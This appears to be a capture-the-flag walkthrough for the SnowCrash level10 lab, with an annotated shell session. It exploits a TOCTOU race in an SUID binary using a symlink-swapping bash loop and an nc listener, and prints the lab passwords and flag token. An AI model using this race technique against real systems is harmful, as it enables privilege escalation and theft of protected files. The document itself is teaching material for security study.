# Login as level10.
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level10
level10@192.168.1.64's password: s5cAJpM8ev6XHw998pRWG728z
# An SUID executable and token file are located in home directory.
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
level10@SnowCrash:~$ cat token
cat: token: Permission denied
# Use ltrace to intercept dynamic library calls and system calls executed by the program.
level10@SnowCrash:~$ ltrace ./level10 token localhost
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                                                                                                                 = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)                                                                                                   = 31
+++ exited (status 31) +++
# Man page of access warns about security hole.
#   NOTES
#     Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole,
#	  because the user might exploit the short time interval between checking and opening the file to manipulate it.
# A question was asked on SO : https://stackoverflow.com/questions/7925177/access-security-hole
# An answer talk about TOCTOU race (Time of Check to Time of Update).
#   That is a TOCTOU race (Time of Check to Time of Update). A malicious user could substitute a file
#   he has access to for a symlink to something he doesn't have access to between the access() and the open() calls.
# Implementation of TOCTOU
level10@SnowCrash:~$ vi /tmp/toctou.sh
#!/bin/bash

TOKEN=/home/user/level10/token
SYMLINK=/tmp/symlink
EMPTYFILE=/tmp/empty
TMPFILE=$(/bin/mktemp)

/usr/bin/touch $EMPTYFILE
/bin/ln -s $TOKEN $SYMLINK

while true
do
	/bin/mv $SYMLINK $TMPFILE
	/bin/mv $EMPTYFILE $SYMLINK
	/bin/mv $TMPFILE $EMPTYFILE
done
level10@SnowCrash:~$ chmod +x /tmp/toctou.sh
level10@SnowCrash:~$ /tmp/toctou.sh &
level10@SnowCrash:~$ nc -lk 6969 | grep -v ".*( )*." &
# Run binary in a while loop and white for TOCTOU to get password from token file.
# Don't panic! It may take a while.
level10@SnowCrash:~$ while true; do ./level10 /tmp/symlink 127.0.0.1; done &>/dev/null
woupa2yuojeeaaed06riuj63c
# Login as flag10 and get the flag.
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
